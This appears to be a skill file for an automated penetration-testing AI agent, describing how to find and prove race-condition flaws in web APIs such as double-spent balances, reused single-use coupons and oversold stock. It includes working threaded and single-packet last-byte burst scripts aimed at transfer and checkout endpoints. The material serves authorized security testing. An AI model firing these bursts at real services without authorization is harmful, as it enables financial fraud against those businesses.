---
name: race_condition
agent: agent8_logic
description: Detect and prove TOCTOU races — parallel-request emission, single-packet timing, coupon/vote/checkout double-submit, and balance-delta proof of overspend.
---

# Race Condition

## Purpose
This skill finds time-of-check-to-time-of-use (TOCTOU) race conditions: operations the server performs non-atomically, so N parallel requests each see the pre-operation state and all succeed. The classic impacts are financial — spending the same balance twice, redeeming a single-use coupon N times, buying inventory that doesn't exist — plus integrity impacts like duplicate votes, duplicate account creation, and bypassing rate limits. Proof must show the impossible end-state (overspend beyond balance, negative inventory), never just "two 200s".

## Division of labor
- **Consumes:** state-changing endpoints from `recon/endpoints_live.txt` (POST/PUT/PATCH/DELETE with side effects), any balance-like field observed (`balance`, `credits`, `stock`, `uses_left`, `votes`) from `recon/sample_responses/`
- **Produces:** the finished artifact — `findings/race_condition_confirmed.md` with balance-delta evidence and raw request/response pairs

## When to use / when NOT to use
- **Use when:** you found a state-changing endpoint with a check-then-act shape (apply coupon → discount; transfer credits → debit; place order → decrement stock; vote → increment counter); a balance/credit/stock field is readable before and after; an idempotency key is absent or client-controlled.
- **Skip when (time-pass filter):** the endpoint is idempotent by construction (PUT with full state, deterministic keys), the "balance" is cosmetic client-side display with no server debit, or the operation requires a human step (email confirmation) between check and act. Ask: does winning the race move real value or real state? Is it reachable with the access I have?

## Methodology
1. **Identify the timing window.** Pick a state-changing endpoint and map its check→act sequence: read balance/stock (`GET /api/wallet`), then mutate (`POST /api/transfer`). The race window is the gap between the server's balance check and the debit write. Record both endpoints and the balance field name.
2. **Establish the baseline balance.** Read the balance field twice, 5 seconds apart, with no requests in between. Both reads must agree — this is your pre-race anchor. Save raw responses.
3. **Fire the parallel burst.** Emit N identical mutating requests in parallel (N=10 to start, same session, same payload). Use threads (simple) — escalate to single-packet sync only if threads show no window.
4. **Read the post-race balance.** Immediately re-read the balance field twice. Compute the delta: expected delta (serial execution) vs actual delta (raced execution). If 10 transfers of 10 credits each moved 100 credits from a 50-credit balance, the check was not atomic — that's the finding.
5. **Prove overspend > balance.** The bar is an impossible end-state: final balance negative, or total debited exceeding the starting balance, or stock below zero, or a single-use coupon redeemed twice with two distinct success receipts. "Two 200 responses" alone is INCONCLUSIVE — duplicate 200s can be idempotent retries.
6. **Coupon TOCTOU.** Apply the same single-use coupon code in N parallel checkout requests. Collect every response's order/confirmation ID. Two DIFFERENT confirmation IDs both showing the discount applied = confirmed double-redeem. Same ID twice = idempotent, NEGATIVE.
7. **Checkout double-submit.** Submit the identical checkout payload twice in parallel (same cart, same payment token). Check for two charges / two order IDs / inventory decremented twice. Watch for client-generated idempotency keys — if the key is server-issued per checkout session, generate two sessions.
8. **Vote/counter races.** POST N parallel votes/likes. Re-read the counter: increment of N from parallel requests that each read the old value proves a non-atomic increment (lost-update in reverse — all N won).
9. **Single-packet escalation.** If threaded bursts show no window, use last-byte synchronization: open N TCP connections, send each request except the final byte, then flush all final bytes simultaneously. This collapses arrival to ~microseconds and wins races that 10ms-spaced threads lose.
10. **Negative-inventory oversell.** Race N purchases against stock=1. If two orders confirm, re-read stock: negative or zero-with-two-orders = confirmed oversell.
11. **Check idempotency-key behavior.** If requests carry `Idempotency-Key`, test: (a) reuse the same key twice serially — same result or double charge? (b) omit the key — does the server generate one or skip the check? A client-controlled key that the server ignores is not a defense.
12. **Mind the concurrency-safety pitfalls in your own proof.** Run each race 2x independently. Between runs, reset state if possible (refund, restock) and re-anchor the baseline. A "success" that only appears once across 5 runs is INCONCLUSIVE, not CONFIRMED.
13. **Rate-limit interference check.** If later requests in the burst return 429, the window measurement is polluted — note it, reduce N or slow the ramp, and re-run. A 429 on request 8 of 10 does not invalidate requests 1–7.
14. **Quantify impact.** Compute the maximum extractable value per burst and per account (can you loop it? does the balance reset?). Financial impact = (overspend per run) × (repeatability). Document the exact math in the artifact.
15. **Write every vector up.** CONFIRMED needs the impossible end-state; INCONCLUSIVE needs the ambiguity named; NEGATIVE needs the serial-vs-parallel delta table showing no difference.

## Exact commands
Baseline — anchor the balance field twice with no requests between (run FIRST):
```bash
curl -s -b cookies_A.txt "https://<HOST>/api/wallet" -o /tmp/race_bal_1.json; sleep 5
curl -s -b cookies_A.txt "https://<HOST>/api/wallet" -o /tmp/race_bal_2.json
diff /tmp/race_bal_1.json /tmp/race_bal_2.json && echo "BASELINE STABLE"
grep -o '"balance":[0-9.]*' /tmp/race_bal_1.json
```
Parallel burst — 10 identical transfers, threaded, with per-thread status capture:
```bash
python3 - <<'EOF'
import concurrent.futures, subprocess, json
URL="https://<HOST>/api/transfer"
DATA='{"to_user_id":999,"amount":10}'
def fire(i):
    p=subprocess.run(["curl","-s","-o","/dev/null","-w","%{http_code}",
                      "-b","cookies_A.txt","-X","POST",URL,
                      "-H","Content-Type: application/json","-d",DATA],
                     capture_output=True,text=True)
    return (i,p.stdout.strip())
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    results=list(ex.map(fire,range(10)))
print(results)
ok=sum(1 for _,c in results if c=="200")
print(f"succeeded: {ok}/10")
EOF
```
Post-race balance read + delta math:
```bash
curl -s -b cookies_A.txt "https://<HOST>/api/wallet" -o /tmp/race_bal_after.json
python3 - <<'EOF'
import json
before=json.load(open("/tmp/race_bal_1.json"))["balance"]
after=json.load(open("/tmp/race_bal_after.json"))["balance"]
n_ok=10; amount=10
expected=before-n_ok*amount
print(f"before={before} after={after} expected_if_serial={expected}")
print(f"overspend_beyond_balance={before-after > before}")  # impossible end-state
print(f"delta_matches_serial={after==expected}")
EOF
# CONFIRMED only if after < 0, or (before-after) > before, i.e. more left the account than it held.
```
Coupon double-redeem — collect distinct confirmation IDs:
```bash
python3 - <<'EOF'
import concurrent.futures, subprocess, json, re
URL="https://<HOST>/api/checkout"
DATA='{"cart_id":"<CART>","coupon":"WELCOME10"}'
def fire(i):
    p=subprocess.run(["curl","-s","-b","cookies_A.txt","-X","POST",URL,
                      "-H","Content-Type: application/json","-d",DATA],
                     capture_output=True,text=True)
    ids=re.findall(r'"(?:order_id|confirmation_id)"\s*:\s*"([^"]+)"',p.stdout)
    disc='"discount"' in p.stdout or '"coupon_applied":true' in p.stdout
    return (p.stdout[:80],ids,disc)
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    results=list(ex.map(fire,range(8)))
all_ids=[i for _,ids,_ in results for i in ids]
print("distinct confirmation ids:",set(all_ids),"count:",len(set(all_ids)))
print("discount seen in responses:",sum(1 for _,_,d in results if d))
# CONFIRMED: >=2 DISTINCT ids each with discount applied, from a single-use coupon.
EOF
```
Single-packet last-byte sync (escalation when threads show no window):
```bash
python3 - <<'EOF'
import socket, ssl, threading
HOST="<HOST>"; PORT=443
PATH="/api/transfer"; BODY='{"to_user_id":999,"amount":10}'
req=(f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: {len(BODY)}\r\n"
     f"Content-Type: application/json\r\nCookie: <COOKIE_A>\r\nConnection: close\r\n\r\n{BODY}")
raw=req.encode(); N=10
conns=[]
for _ in range(N):
    s=socket.create_connection((HOST,PORT))
    s=ssl.create_default_context().wrap_socket(s,server_hostname=HOST)
    s.sendall(raw[:-1]); conns.append(s)   # hold the last byte
barrier=threading.Barrier(N+1)
def flush(s):
    barrier.wait(); s.sendall(raw[-1:]); s.recv(4096); s.close()
ts=[threading.Thread(target=flush,args=(c,)) for c in conns]
[t.start() for t in ts]; barrier.wait(); [t.join() for t in ts]
print("single-packet burst sent")
EOF
```
2x independent reproduction (reset state between runs, re-anchor baseline each time):
```bash
for RUN in 1 2; do
  echo "=== RUN $RUN baseline ==="
  curl -s -b cookies_A.txt "https://<HOST>/api/wallet" | grep -o '"balance":[0-9.]*'
  echo "=== RUN $RUN burst ==="
  python3 /tmp/race_burst.py   # the threaded burst above, saved to file
  echo "=== RUN $RUN after ==="
  curl -s -b cookies_A.txt "https://<HOST>/api/wallet" | grep -o '"balance":[0-9.]*'
done
# CONFIRMED requires the impossible end-state in BOTH runs.
```

## Completion-bias defenses
- [ ] Timing window mapped: check endpoint, act endpoint, balance/stock field name recorded
- [ ] Baseline balance read twice with no requests between — both agree, raw saved
- [ ] Parallel burst fired (N=10 threaded) with per-request status codes captured
- [ ] Post-race balance re-read; serial-expected vs actual delta computed
- [ ] Overspend proof: impossible end-state shown (negative balance, debited > starting balance, stock < 0)
- [ ] Coupon TOCTOU tested: distinct confirmation IDs with discount collected
- [ ] Checkout double-submit tested (two charges / two order IDs checked)
- [ ] Vote/counter race tested where a counter endpoint exists
- [ ] Single-packet last-byte sync attempted if threaded bursts showed no window
- [ ] Idempotency-Key behavior tested (reuse serially, omit entirely)
- [ ] 2x independent reproduction with state reset + re-anchored baseline between runs
- [ ] Rate-limit (429) interference checked and accounted for
- [ ] Impact quantified: overspend per run × repeatability, exact math in artifact
- [ ] Every vector has a verdict with raw pairs in `findings/race_condition_confirmed.md`
- **Review step:** agent10_review must verify for each CONFIRMED verdict: (1) pre-race baseline balance is anchored with two agreeing reads, (2) the end-state is mathematically impossible under serial execution (show the arithmetic), (3) both reproduction runs independently reach the impossible state, and (4) duplicate-200 responses are NOT counted as proof without the balance/counter delta.
- **Nudge prompts:** "Keep going until you have tested every parameter, not just the first one that responded." / "Do not report done before the finished artifact exists on disk." / "Two 200s is not a race condition — show the balance that cannot exist."
- **Finished artifact definition:** `findings/race_condition_confirmed.md` exists and contains, per tested vector: the check→act endpoint pair, baseline balance reads, burst parameters (N, method), post-race reads, the serial-vs-actual delta arithmetic, both reproduction runs, and verdict CONFIRMED / INCONCLUSIVE / NEGATIVE.

## Evidence standard
- Baseline: compare every hit against a known-dead path on the same host
- Reproduction: 2x independent reproduction required
- Raw evidence: full request/response pairs saved
- Verdicts: CONFIRMED (meets all three) / INCONCLUSIVE (needs a second model run or human) / NEGATIVE (dead end, documented so nobody re-tests it)

## Handoffs
- `price_tamper` consumes CONFIRMED coupon races: a double-redeemable coupon stacks with price parameters — it needs the coupon code, the confirmation-ID evidence, and whether the coupon endpoint is per-account or global.
- `agent9_chain` consumes CONFIRMED overspend: repeatable value extraction chains into account-funding abuse — it needs the per-run math and the reset/repeat procedure from the artifact.
- `finding_validator` consumes INCONCLUSIVE single-run successes: it re-runs the 2x protocol independently — it needs the exact burst script and baseline files referenced in the artifact.
